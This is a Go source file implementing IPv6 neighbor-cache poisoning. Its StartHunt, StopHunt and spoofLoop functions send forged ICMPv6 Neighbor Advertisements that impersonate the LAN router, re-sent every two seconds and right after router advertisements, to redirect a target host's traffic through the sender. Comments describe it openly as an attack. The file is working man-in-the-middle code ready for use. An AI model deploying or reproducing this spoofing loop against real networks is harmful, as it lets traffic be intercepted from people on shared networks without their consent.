package icmp

import (
	"fmt"
	"math/rand"
	"time"

	"github.com/irai/packet"
)

// StartHunt will actively poison the target IP with fake icmp6 NA to redirect
// all traffic to us. Poisoning will continue until StopHunt() is called.
//
// The target IP must be a IPv6 LLA or nil.  If IP is nil, we use unicast
// ethernet address but the multicast ip address to get the packet to the target host.
func (h *Handler6) StartHunt(addr packet.Addr) (packet.HuntStage, error) {
	if Logger6.IsInfo() {
		Logger6.Msg("start neighbor hunt").Struct(addr).Write()
	}
	if addr.IP.Is4() {
		return packet.StageNoChange, packet.ErrInvalidIP
	}
	if addr.IP.Is6() && !addr.IP.IsLinkLocalUnicast() {
		return packet.StageNoChange, nil
	}
	h.Lock()
	if h.huntList.Index(addr.MAC) != -1 {
		h.Unlock()
		return packet.StageHunt, nil
	}
	h.huntList.Add(addr)
	h.Unlock()

	go h.spoofLoop(addr)

	return packet.StageHunt, nil
}

// StopHunt stop poisoning attack for target IP.
func (h *Handler6) StopHunt(addr packet.Addr) (packet.HuntStage, error) {
	if Logger6.IsInfo() {
		Logger6.Msg("stop neighbor hunt").Struct(addr).Write()
	}
	if addr.IP.IsValid() && !addr.IP.IsLinkLocalUnicast() {
		return packet.StageNoChange, nil
	}
	h.Lock()
	h.huntList.Del(addr)
	h.Unlock()
	return packet.StageNormal, nil
}

// spoofLoop attacks the client with neighbor advertisement attacks
//
// It will continuously send a number of NA packets to client until the mac is no longer in hunt list.
func (h *Handler6) spoofLoop(dstAddr packet.Addr) {
	rand.Seed(time.Now().UnixNano())
	startTime := time.Now()
	nTimes := 0

	// if no IP, then use unicast Ether address and multicast IP to get packet to destination
	if !dstAddr.IP.IsValid() {
		dstAddr.IP = packet.IP6AllNodesMulticast
	}

	if Logger6.IsDebug() {
		Logger6.Msg("NA attack start").Struct(dstAddr).Time("time", startTime).Write()
	}
	for {
		h.Lock()

		if h.huntList.Index(dstAddr.MAC) == -1 || h.closed {
			h.Unlock()
			Logger6.Msg("NA attack end").Struct(dstAddr).Int("repeat", nTimes).Duration("duration", time.Since(startTime)).Write()
			return
		}

		// Attack when we have the router LLA only
		if h.Router != nil {
			list := []packet.Addr{}
			for _, router := range h.LANRouters {
				list = append(list, router.Addr)
			}

			h.Unlock()

			for _, routerAddr := range list {
				hostAddr := packet.Addr{MAC: h.session.NICInfo.HostAddr4.MAC, IP: h.session.NICInfo.HostLLA.Addr()}
				targetAddr := packet.Addr{MAC: h.session.NICInfo.HostAddr4.MAC, IP: routerAddr.IP}
				fakeRouter := packet.Addr{MAC: hostAddr.MAC, IP: routerAddr.IP}

				if err := h.session.ICMP6SendNeighborAdvertisement(fakeRouter, dstAddr, targetAddr); err != nil {
					fmt.Println("icmp6 : error sending na ", err)
				}

				/* no need to send this - May 21
				if err := h.SendNeighbourSolicitation(fakeRouter, dst, dstAddr.IP); err != nil {
					fmt.Println("icmp6 : error sending na ", err)
				}
				*/

				if nTimes%16 == 0 {
					if Logger6.IsDebug() {
						Logger6.Msg("NA attack src").Struct(hostAddr).Label("dst").Struct(dstAddr).Label("target").Struct(targetAddr).
							Int("repeat", nTimes).Duration("duration", time.Since(startTime)).Write()
					}
				}
				nTimes++

				/**
					// spoof router
					if !dstAddr.IP.Equal(packet.IP6AllNodesMulticast) { // dont spoof router if we don't know the IPv6
					targetAddr.IP = dstAddr.IP
					if err := h.SendNeighborAdvertisement(host, routerAddr, targetAddr); err != nil {
						fmt.Println("icmp6 : error sending na ", err)
					}
				}
				*/
			}
		} else {
			h.Unlock()
			if nTimes%64 == 0 {
				fmt.Printf("icmp6 : na attack failed - missing router LLA %s\n", dstAddr)
			}
			nTimes++
		}

		select {
		case <-h.closeChan:
			// icmp6 spoof goroutines wait on this channel to receive
			// notifications of new Router Advertisements send by the lan router.
			//
			// In ProcessPacket(), upon receiving an RA, the processor will close this channel to wakeup waiting
			// goroutines as we want to re-spoof the target immediately after the RA message.
			// For example:
			//   Tplink home router sends RA every 3 seconds and we wakeup immediately after to
			//   send a spoofed NA. In turn, the target keep routing to us :-).

		case <-time.After(time.Millisecond*2000 + time.Duration(rand.Int31n(800))):
			// 2 second spoof seem to be adequate to keep cache poisoned
		}
	}
}
